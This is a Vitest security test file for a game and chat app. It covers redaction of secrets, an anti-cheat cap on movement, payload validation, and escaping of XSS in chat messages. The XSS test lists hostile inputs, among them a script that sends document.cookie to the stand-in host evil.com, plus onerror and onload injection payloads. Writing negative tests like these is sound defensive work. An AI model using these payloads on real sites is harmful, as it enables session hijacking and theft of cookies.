import { describe, expect, it } from "vitest";
import { validateChatMessage } from "../../src/lib/chatRepository";
import { generateAuditId, redactSensitiveData } from "../../src/lib/observability";
import { clampMovement, isValidMovementPayload, MAX_TELEPORT_DISTANCE } from "../../src/lib/realtime/protocol";

describe("Block 33: Security Review & Negative Testing", () => {
  describe("Secret and Sensitive Data Leak Prevention", () => {
    it("redacts sensitive fields like passwords, tokens, emails, and credentials", () => {
      const payload = {
        userId: "user-123",
        username: "learner_one",
        email: "test@example.com",
        password: "SuperSecretPassword123!",
        userToken: "header.payload.signature",
        session: {
          refreshToken: "secret-token",
          authHeader: "Bearer 123456",
        },
        profile: {
          level: 5,
          coins: 150,
          locationGps: { lat: -6.2, lng: 106.8 },
        },
      };

      const redacted = redactSensitiveData(payload) as Record<string, unknown>;

      expect(redacted.password).toBe("[REDACTED]");
      expect(redacted.email).toBe("[REDACTED]");
      expect(redacted.userToken).toBe("[REDACTED]");
      expect((redacted.session as Record<string, unknown>).refreshToken).toBe("[REDACTED]");
      expect((redacted.session as Record<string, unknown>).authHeader).toBe("[REDACTED]");
      expect((redacted.profile as Record<string, unknown>).locationGps).toBe("[REDACTED]");

      // Safe non-sensitive fields are preserved
      expect(redacted.userId).toBe("user-123");
      expect(redacted.username).toBe("learner_one");
      expect((redacted.profile as Record<string, unknown>).level).toBe(5);
      expect((redacted.profile as Record<string, unknown>).coins).toBe(150);
    });

    it("generates unique cryptographically compliant audit IDs", () => {
      const id1 = generateAuditId();
      const id2 = generateAuditId();
      expect(id1).not.toBe(id2);
      expect(id1.startsWith("aud-")).toBe(true);
    });
  });

  describe("Anti-Cheat: Realtime Movement Clamping & Validation", () => {
    it("clamps teleport / speedhack attempts beyond max permissible displacement", () => {
      const currentPos = { x: 0, z: 0 };
      // User mencoba teleport 50 unit dalam 1 frame
      const maliciousTarget = { x: 50, z: 50 };

      const clamped = clampMovement(currentPos, maliciousTarget);

      // Jarak per frame dibatasi maksimal MAX_TELEPORT_DISTANCE (4.0 unit)
      const displacement = Math.hypot(clamped.x - currentPos.x, clamped.z - currentPos.z);
      expect(displacement).toBeLessThanOrEqual(MAX_TELEPORT_DISTANCE + 0.05);
      expect(displacement).toBeCloseTo(MAX_TELEPORT_DISTANCE, 2);
    });

    it("rejects malformed or out-of-spec movement payloads", () => {
      expect(isValidMovementPayload(null)).toBe(false);
      expect(isValidMovementPayload({})).toBe(false);
      expect(
        isValidMovementPayload({
          playerId: "p1",
          roomId: "r1",
          x: NaN, // Invalid coordinate
          z: 0,
          rotation: 0,
          animState: "walk",
          seq: 1,
          timestamp: Date.now(),
          version: 1,
        }),
      ).toBe(false);

      expect(
        isValidMovementPayload({
          playerId: "p1",
          roomId: "r1",
          x: 0,
          z: 0,
          rotation: 0,
          animState: "flying", // Invalid animation state
          seq: 1,
          timestamp: Date.now(),
          version: 1,
        }),
      ).toBe(false);
    });
  });

  describe("XSS and Injection Neutralization", () => {
    it("escapes script tags and inline event handlers in user messages", () => {
      const maliciousInputs = [
        '<script>document.location="http://evil.com?c="+document.cookie</script>',
        '<img src=x onerror=alert(1)>',
        '"><svg onload=confirm(1)>',
        'javascript:void(0)',
      ];

      for (const input of maliciousInputs) {
        const result = validateChatMessage(input);
        expect(result.sanitized).not.toContain("<script>");
        expect(result.sanitized).not.toContain("<img");
        expect(result.sanitized).not.toContain("<svg");
      }
    });
  });
});
